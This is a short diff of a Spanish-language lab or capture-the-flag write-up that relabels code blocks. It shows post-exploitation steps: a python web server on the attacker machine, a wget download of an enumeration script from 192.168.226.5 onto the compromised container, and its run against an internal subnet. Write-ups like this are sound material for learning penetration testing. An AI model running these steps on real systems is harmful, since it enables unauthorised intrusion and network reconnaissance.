@@ -322,19 +322,20 @@ Observamos que nos encontramos en un contenedor, para enumerar los Hosts activos
 
 Para subir a la maquina comprometida haremos uso de un servidor en `python3`.
 
-```c
+```python
 ❯ python3 -m http.server 80
 ```
 
 Para descargar el script usaremos `wget`
 
-```c
+```python
 wget http://192.168.226.5/HostPortEnumerator.sh
 chmod +x HostPortEnumerator.sh
 ```
 
 Ahora ejecutaremos el script:
 
-```c
+```python
 ./HostPortEnumerator.sh -H 172.18.0.1-254
 ```
+
